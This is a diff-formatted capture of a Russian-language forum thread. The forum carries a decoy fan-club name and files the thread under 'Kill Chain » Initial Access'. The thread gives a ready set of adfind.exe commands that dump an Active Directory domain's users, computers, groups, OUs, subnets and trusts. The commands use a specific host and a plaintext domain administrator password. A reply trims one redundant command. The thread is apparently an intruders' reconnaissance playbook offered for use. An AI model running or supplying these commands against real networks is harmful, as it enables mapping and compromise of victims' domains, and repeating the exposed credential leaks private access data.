@@ -1,0 +1,96 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Initial Access »
+    AdFind Guide
+
+AdFind Guide
+Alter · 3 · 60
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 11:52:02 am
+Записан
+
+Post
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Марта 15, 2021, 01:55:04 am
+Записан
+
+Код: [Выделить]
+
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "(objectcategory=person)" > ad_users.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7  -f "objectcategory=computer" > ad_computers.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "(objectcategory=organizationalUnit)" >  ad_ous.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -sc trustdmp > trustdmp.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -subnets -f (objectCategory=subnet) > subnets.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "(objectcategory=group)" > ad_group.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -gcb -sc trustdmp > trustdmp.txt
+
+Опрос adfind с LOGIN PASS DOMAIN WITHOU CONTEXT FROM NETWORK/VPN
+« Последнее редактирование: Марта 15, 2021, 01:57:22 am от Rozetka »
+
+giovanni
+
+    Users
+    Member
+    *
+        2
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #2 : Июня 11, 2021, 08:36:52 am
+Записан
+
+Можно убрать вот это:
+Код: [Выделить]
+
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -sc trustdmp > trustdmp.txt
+
+
+Крайняя команда перезаписывает в любом случае.
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Initial Access »
+    AdFind Guide
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
